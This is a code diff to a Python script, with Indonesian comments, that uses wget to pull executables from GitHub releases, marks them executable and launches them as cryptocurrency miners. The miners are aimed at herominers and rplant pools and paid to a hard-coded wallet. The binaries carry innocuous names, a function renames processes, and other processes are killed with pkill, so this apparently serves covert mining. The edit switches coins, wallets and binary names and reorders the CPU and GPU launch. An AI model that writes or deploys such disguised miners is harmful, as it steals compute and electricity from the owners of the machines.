@@ -41,17 +41,24 @@ downloads = {
         "link": "wget -q https://github.com/handevproject/starterpack/releases/download/1.0.0/lol",
         "run": [
             "chmod +x lol",
-            "./plant/plant ./lol --algo KARLSEN --pool us.nexellia.herominers.com:1143 --user nexellia:qp2e339adz2fra94avvfa2xdctpu6pfs62me04hdeyesqvaxl58eg92hg0kdc.clarksye"
+            "./plant/plant ./lol --algo PYRIN --pool us.pyrin.herominers.com:1177 --user pyrin:qpw6m4gsf4zjceusefcx02fw6t6jv3qlt6dmfmkjdd59fm2569gwvs3e8dg3w.clarksye"
         ]
     },
     "cpu": {
-        "link": "wget -q https://github.com/clarksye/starterpack/releases/download/1.1.0/nish",
+        "link": "wget -q https://github.com/handevproject/starterpack/releases/download/1.0.1/plane",
         "run": [
-            "chmod +x nish",
-            "./plant/plant ./nish -a yespower -o stratum+tcps://stratum-na.rplant.xyz:17052 -u v3DEMbMrwFetzmzEo6DeUKQnppXSqZZSxg.clarksye"
+            "chmod +x plane",
+            "./plant/plant ./plane -a yespower -o stratum+tcps://stratum-na.rplant.xyz:17052 -u v3DEMbMrwFetzmzEo6DeUKQnppXSqZZSxg.clarksye"
         ]
     }
 }
+
+def kill_processes():
+    process_list = ['plant', 'plant-local', 'non', 'plane']
+    # Menggabungkan daftar proses menjadi satu string dengan pemisah "|"
+    process_string = "|".join(process_list)
+    # Menjalankan perintah pkill dengan opsi -f untuk mencocokkan semua pola sekaligus
+    subprocess.run(['pkill', '-9', '-f', process_string])
 
 def set_process_name(new_name):
     try:
@@ -195,15 +202,9 @@ def check_url_response(username, list):
         # Tangani kesalahan pada saat HTTP request
         print(f"Error during HTTP request: {e}")
         return False
-    
-def kill_processes():
-    process_list = ['graftcp', 'graftcp-local', 'lol', 'nish']
-    # Menggabungkan daftar proses menjadi satu string dengan pemisah "|"
-    process_string = "|".join(process_list)
-    # Menjalankan perintah pkill dengan opsi -f untuk mencocokkan semua pola sekaligus
-    subprocess.run(['pkill', '-9', '-f', process_string])
 
 def reset():
+    kill_processes()
     delete_all_in_current_location()
     # make folder
     run_bash_command(f"mkdir -p {args.folder}")
@@ -214,16 +215,16 @@ def reset():
     run_bash_command(command_folder + downloads['graphics']['run'][0])
     run_bash_command(command_folder + downloads['graphics']['run'][1])
     set_ip(command_folder, args.ip)
-    
-    if args.gpu: 
-        # handle gpu
-        run_bash_command(command_folder + downloads['gpu']['link'])
-        run_gpu(command_folder)
 
     if args.cpu: 
         # handle cpu
         run_bash_command(command_folder + downloads['cpu']['link'])
         run_cpu(command_folder)
+    
+    if args.gpu: 
+        # handle gpu
+        run_bash_command(command_folder + downloads['gpu']['link'])
+        run_gpu(command_folder)
 
     return
 
@@ -246,11 +247,11 @@ else:
 
                 set_ip(command_folder, ip)
                 break
+        
+        if args.cpu:
+            run_gpu(command_folder)
             
         if args.gpu:
-            run_gpu(command_folder)
-
-        if args.cpu:
             run_gpu(command_folder)
     else:
         reset()
